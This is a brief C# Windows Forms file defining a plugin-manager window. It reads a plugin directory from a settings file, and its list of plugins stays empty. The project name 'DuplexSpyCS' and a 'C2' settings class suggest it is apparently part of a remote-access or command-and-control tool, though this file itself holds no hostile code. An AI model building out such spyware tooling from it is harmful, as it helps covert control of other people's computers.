using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace DuplexSpyCS
{
    public partial class frmPlugin : Form
    {
        private string m_szPluginDirectory { get; set; }
        private IniManager m_iniMgr = C2.ini_manager;

        public frmPlugin()
        {
            InitializeComponent();

            m_szPluginDirectory = m_iniMgr.Read("Plugin", "Directory");
        }

        void fnRefresh()
        {
            listView1.Items.Clear();



            toolStripStatusLabel1.Text = $"Plugin[{listView1.Items.Count}]";
        }

        void fnSetup()
        {
            fnRefresh();
        }

        private void frmPlugin_Load(object sender, EventArgs e)
        {
            fnSetup();
        }
    }
}
